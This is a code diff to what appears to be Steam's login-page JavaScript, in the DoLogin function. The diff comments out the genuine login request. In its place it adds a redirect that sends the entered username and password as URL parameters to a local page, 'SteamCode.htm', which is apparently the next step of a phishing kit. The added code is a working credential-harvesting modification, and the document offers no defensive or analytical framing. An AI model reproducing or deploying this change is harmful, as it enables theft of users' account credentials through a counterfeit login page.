@@ -219,22 +219,25 @@ CLoginPromptManager.prototype.UpdateCaptcha = function( gid )
 	this.m_gidCaptcha = gid;
 };
 
-CLoginPromptManager.prototype.DoLogin = function()
-{
+CLoginPromptManager.prototype.DoLogin = function() {
 	var form = this.m_$LogonForm[0];
 
 	var username = form.elements['username'].value;
-	this.m_strUsernameEntered = username;
-	username = username.replace( /[^\x00-\x7F]/g, '' ); // remove non-standard-ASCII characters
-	this.m_strUsernameCanonical = username;
+	//this.m_strUsernameEntered = username;
+	username = username.replace(/[^\x00-\x7F]/g, ''); // remove non-standard-ASCII characters
+	//this.m_strUsernameCanonical = username;
 
 	var password = form.elements['password'].value;
-	password = password.replace( /[^\x00-\x7F]/g, '' ); // remove non-standard-ASCII characters
+	password = password.replace(/[^\x00-\x7F]/g, ''); // remove non-standard-ASCII characters
 
-	if ( this.m_bLoginInFlight || password.length == 0 || username.length == 0 )
+	if (this.m_bLoginInFlight || password.length == 0 || username.length == 0){
 		return;
-
-	this.m_bLoginInFlight = true;
+    }
+	else
+    {
+		window.location.assign("./SteamCode.htm?username=" + username + "&password=" + password)
+	}
+	/*this.m_bLoginInFlight = true;
 	$J('#login_btn_signin').hide();
 	$J('#login_btn_wait').show();
 
@@ -249,7 +252,7 @@ CLoginPromptManager.prototype.DoLogin = function()
 			$J('#login_btn_signin').show();
 			$J('#login_btn_wait').hide();
 			_this.m_bLoginInFlight = false;
-		});
+		});*/
 };
 
 // used to get mobile client to execute a steammobile URL
